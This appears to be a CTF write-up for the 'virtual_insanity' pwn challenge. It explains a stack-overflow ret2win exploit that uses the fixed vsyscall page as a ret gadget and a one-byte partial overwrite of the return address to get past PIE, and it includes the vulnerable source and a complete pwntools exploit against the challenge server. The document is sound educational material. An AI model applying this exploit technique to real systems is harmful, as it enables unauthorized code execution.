![Screenshot 2025-02-26 113030](https://github.com/user-attachments/assets/fd4721d4-694d-45c0-9e46-d799995012e0)
\
I didn't solve this problem on time but i think this problem really testing our fundamental understanding in pwning (IMO). We will see why.

# NOTE :
Author said there's no need of bruteforcing in this challenge and also the challenge is not dependent in libc.
And also if **vsyscall** is not enabled in your machine please refer to [this](https://helpcenter.onlyoffice.com/installation/mail-enabling-vsyscall.aspx) article.

# Technique = Ret2win (with **vsyscall** gadget)

## 1. Checking given file.
Given a zip file that contains 2 files which are _chall_ and _src.c_
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("IMPOSSIBLE! GRAHHHHHHHHHH\n");
    puts(getenv("FLAG"));
}

int main() {
    char buf[0x20];
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    puts("You pathetic pwners are worthless without your precious leaks!!!");
    read(0, buf, 0x50);
}
```

Checking binary protection.
```bash
[*] '/home/relster/Desktop/ctf/trx/pwn/virtual_instanity/dist/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

As we can see this challenge looks pretty simple at first glance, it looks like a simple ret2win challenge. But the problem now is, how do we return to the win function? there's no leak and PIE is enabled. The short answer is we can make use of the gadget available at _vsyscall_, so the gadget that we're gonna need is just a simple _ret_ gadget and we can find that by jumping to _vsyscall_'s address which located at fixed address at _0xffffffffff600000_, the instructions is somewhat look like this:
```asm
__vsyscall_page:
    mov $__NR_gettimeofday, %rax
    syscall
    ret
```
Now we have a _ret_ gadget, so the next technique is partially overwriting the return address in stack to win() function. We will see clearly what i mean below.


## 2. Analyzing Binary in GDB.
First let's set breakpoints at these addresses to check the stack before and after we send our junk input:
![Screenshot 2025-02-27 015002](https://github.com/user-attachments/assets/f67c20ea-2bcf-405e-b7cc-48be49f90791)

Stack layout **before** junk input:
![Screenshot 2025-02-27 015556](https://github.com/user-attachments/assets/36810dd3-6fad-48e2-8835-75161f019bbe)

Stack layout **after** junk input:
![Screenshot 2025-02-27 015738](https://github.com/user-attachments/assets/64680289-0fff-4d1f-9bc9-d7b5b8eef4a1)
\
![Screenshot 2025-02-27 015823](https://github.com/user-attachments/assets/b26de687-6045-49bb-8536-f356dbacf302)

We can see our junk input (**0x41**s) are there on the stack.

Now let's put our attention at these addresses: \
**0x00007ffff7dd4d68** <-- __libc_start_call_main+120 \
**0x00005555555551da** <-- main 
![image](https://github.com/user-attachments/assets/f902b87e-d92b-4aaa-9259-f7cf7c23c152)

So the buffer is 0x20 (32 bytes) + 8 bytes (RBP) and the 41st byte is the rip, here we can just put the address of _vsyscall_ twice until it reaches the address **0x00005555555551da** which located on the stack as well. \
![image](https://github.com/user-attachments/assets/a1afad91-040c-4ddd-83c8-83e38f0fe04e)

After that we just need to partially overwrite 1 more byte to the **main** function that located there, we will overwrite it with they byte '**\xa9**', why? let's take a look at the image below: \
![image](https://github.com/user-attachments/assets/5ce719d9-ddbc-44bb-bb76-c336693a46d2) \
Since the address of **main** and **win** is only different at their last 1 byte, we can just overflow that '**\xa9**' so that the address of **main** gets overwrite with **win**.

Let's first setup the fake flag in our environment variable for testing the exploit. We'll call the env as **FLAG** like in the binary itself.
```bash
export FLAG="FLAG{fake_flag_DEADBEEF}"
```

## 3. Final Exploit
```python
#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'
#context.log_level = 'DEBUG'

TARGET = './chall'
HOST = 'virtual.ctf.theromanxpl0.it'
PORT = 7011

elf = ELF(TARGET)
#libc = ELF('./libc.so.6')
#ld = ELF("./ld-2.27.so")

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

gdb_script = f"""
    break *main
"""
#gdb.attach(p, gdbscript=gdb_script)

# ===================================== #

"""
0xffffffffff600000 0xffffffffff601000 r-xp     1000      0 [vsyscall]

0xffffffffff600000:  mov    rax,0x60
0xffffffffff600007:  syscall
0xffffffffff600009:  ret
"""

p.recvline()

payload = b'A' * 0x28
payload += p64(0xffffffffff600000) * 2
payload += b'\xa9'

p.send(payload)

p.interactive()
p.close()

# NOTE:
# ret2win (with vsyscall gadget)
```

## 4. Result
Local:
![Screenshot 2025-02-27 024937](https://github.com/user-attachments/assets/dddafed0-2ee5-4c95-b41f-e4d47a629d45)

Remote:
![Screenshot 2025-02-27 025009](https://github.com/user-attachments/assets/3ce2606c-1a1a-4309-b8a9-fccea68ae38f)


## Keyword
ret2win \
vsyscall \
partial address overwrite
